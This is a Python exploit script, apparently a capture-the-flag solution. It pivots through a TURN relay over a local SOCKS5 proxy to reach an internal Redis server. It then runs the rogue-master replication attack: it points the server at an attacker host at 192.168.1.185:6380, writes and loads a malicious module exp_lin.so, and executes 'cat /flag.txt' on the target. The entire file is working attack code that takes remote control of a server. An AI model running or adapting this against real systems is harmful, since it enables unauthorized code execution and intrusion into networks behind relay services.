from turnproxy import SocksIn
from redis_rce import RogueServer, setup as rce_setup

import asyncio
import aiosocks
import sys
import types


TURN_HOST = '127.0.0.1'
TURN_PORT = 3478

LHOST = '192.168.1.185'
LPORT = 6380


async def redis_rce():
    dst = ('0.0.0.0', 6379)
    socks5_addr = aiosocks.Socks5Addr('127.0.0.1', 1337)
    reader, writer = await aiosocks.open_connection(proxy=socks5_addr, proxy_auth=None, dst=dst, remote_resolve=False)

    writer.write(bytes(f"SLAVEOF {LHOST} {LPORT}\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))
    writer.write(bytes(f"CONFIG SET dir /tmp/\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))
    writer.write(bytes(f"CONFIG SET dbfilename exp_lin.so\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))

    await asyncio.sleep(1)

    buf = b''
    while True:
        buf += await reader.read(1)
        if buf.count(b'+PONG\r\n') == 3:
            print(buf.decode('utf-8'))
            break

    rogue = RogueServer(LHOST, LPORT)
    rogue.exp()

    await asyncio.sleep(1)

    writer.write(bytes(f"MODULE LOAD /tmp/exp_lin.so\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))
    writer.write(bytes(f"SLAVEOF NO ONE\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))

    buf = b''
    while True:
        buf += await reader.read(1)
        if buf.count(b'+PONG\r\n') == 2:
            print(buf.decode('utf-8'))
            break

    writer.write(bytes(f'system.exec "cat /flag.txt"\r\n', 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))

    buf = b''
    while True:
        buf += await reader.read(1)
        if buf.count(b'+PONG\r\n') == 1:
            print(buf.decode('utf-8'))
            break

    writer.write(bytes(f"MODULE UNLOAD system\r\n", 'ascii'))
    writer.write(bytes(f"PING\r\n", 'ascii'))

    buf = b''
    while True:
        buf += await reader.read(1)
        if buf.count(b'+PONG\r\n') == 1:
            print(buf.decode('utf-8'))
            break

if __name__ == "__main__":
    opts = types.SimpleNamespace(auth='', verbose=False, file='exp_lin.so')
    rce_setup(opts)

    loop = asyncio.get_event_loop()
    server = loop.run_until_complete(loop.create_server(
        lambda: SocksIn(
            TURN_HOST,  # TURN IP
            TURN_PORT,  # TURN port
            b'',   # username
            b'',   # password
        ),
        host='127.0.0.1',  # socks bind host
        port=1337,  # socks bind port
    ))

    loop.run_until_complete(redis_rce())
    server.close()
